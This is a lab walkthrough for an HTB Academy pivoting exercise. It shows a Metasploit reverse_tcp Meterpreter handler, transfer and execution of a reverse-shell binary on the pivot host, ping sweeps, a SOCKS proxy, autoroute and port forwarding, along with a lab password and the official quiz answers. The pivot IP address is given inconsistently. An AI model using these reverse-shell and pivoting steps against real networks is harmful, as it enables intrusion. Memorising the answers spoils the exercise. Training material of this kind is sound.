# 🛰️ Lab Setup and Pivoting Guide

## **Objective**
To establish a Meterpreter session on an Ubuntu pivot machine, perform network discovery, and set up port forwarding to reach another target within the same subnet as the pivot.

## **Lab Environment**

- Pivot: `Ubuntu 20.04` (`10.129.106.253`)
- Target Network: `172.16.5.0/23`
- Metasploit Framework

---

## **Preparation Steps**

### **Step 1: Gather Initial Information**
```bash
# Use the pivot machine to gather information about the target network using nmap
nmap -sn 172.16.5.0/23
```

### **Step 2: Establish a Meterpreter Session on Pivot**
```bash
# Start msfconsole and configure handler for reverse TCP connection
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run

# Expected Output:
[*] Started reverse TCP handler on 0.0.0.0:8080
```

### **Step 3: Transfer Payload to Pivot**
```bash
# SCP transfer to Ubuntu pivot
scp reverseShell ubuntu@10.129.104.197:~/

# Enter password: HTB_@cademy_stdnt!
# Expected Output:
reverseShell                              100%   83     5.6KB/s   00:00
```

### **Step 4: Execute Payload on Pivot**
```bash
# SSH to pivot and execute payload
ssh ubuntu@10.129.104.197

# On pivot host:
ubuntu@WEB01:~$ chmod +x reverseShell 
ubuntu@WEB01:~$ ./reverseShell
```

### **Step 5: Perform Ping Sweep**
```bash
# From Meterpreter session
meterpreter > shell
Process 3006 created.
Channel 330 created.

bash -i
ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Expected Output:
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.378 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.032 ms
```

---

## **Question 1: Network Discovery**
**"Using the results of the ping sweep, which IP address shows a response indicating that it is reachable?"**

**Official Answer:** `172.16.5.19`

## **Question 2: AutoRoute Configuration**
**"Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format:x.x.x.x/x.x.x.x)"**

**Official Answer:** `172.16.5.0/255.255.254.0`

---

### **Step 6: Configure SOCKS Proxy**
```bash
# Background Meterpreter session
meterpreter > bg
[*] Backgrounding session 1...

# Configure SOCKS proxy
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > run

# Expected Output:
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```

### **Step 7: Configure Proxychains**
```bash
# Ensure /etc/proxychains.conf contains:
socks4 127.0.0.1 9050
```

### **Step 8: Setup AutoRoute**
```bash
# Return to Meterpreter session
msf6 post(multi/manage/autoroute) > sessions -i 1
[*] Starting interaction with 1...

# Add route to target network
meterpreter > run autoroute -s 172.16.5.0/23

# Expected Output:
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.106.254
[*] Use the -p option to list all active routes
```

**Route Analysis:** The AutoRoute adds `172.16.5.0/255.255.254.0` which encompasses the target `172.16.5.19`

---

## **Lab Success Criteria**

✅ **Payload created** and transferred successfully  
✅ **Meterpreter session** established on pivot  
✅ **Ping sweep** reveals two active IPs: 172.16.5.19, 172.16.5.129  
✅ **SOCKS proxy** configured on port 9050  
✅ **AutoRoute** adds route 172.16.5.0/255.255.254.0  
✅ **Network pivoting** enabled through Meterpreter session

---

## **12. Best Practices**

### **Session Management**
- **Background sessions** properly with `bg` command
- **Monitor active sessions** with `sessions -l`
- **Clean up port forwards** when finished
- **Document active routes** for complex networks

### **Network Discovery**
- **Use multiple discovery methods** (ping, TCP scan)
- **Attempt discovery twice** to build ARP cache
- **Document discovered hosts** for later reference
- **Test connectivity** before setting up tunnels

### **Security Considerations**
- **Minimize payload size** for stealth
- **Use HTTPS payloads** when possible
- **Clean up artifacts** after assessment
- **Monitor for detection** during operations

---

## **13. Command Reference**

### **Essential Meterpreter Commands**
```bash
# Background session
bg

# List active sessions
sessions -l

# AutoRoute operations
run autoroute -s 172.16.5.0/23    # Add route
run autoroute -p                  # List routes
run autoroute -d 172.16.5.0/23    # Delete route

# Port forwarding
portfwd add -l 3300 -p 3389 -r 172.16.5.19    # Local forward
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18  # Reverse forward
portfwd list                                    # List forwards
portfwd delete -i 1                            # Delete forward
```

### **Metasploit Auxiliary Modules**
```bash
# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# AutoRoute
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Network discovery
use post/multi/gather/ping_sweep
set RHOSTS 172.16.5.0/23
run
```

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 5
- **Metasploit Documentation**: [Meterpreter Portfwd](https://docs.metasploit.com/)
- **SANS**: [Metasploit Pivoting Techniques](https://www.sans.org)
- **Rapid7**: [AutoRoute Module Documentation](https://rapid7.github.io/metasploit-framework/api/)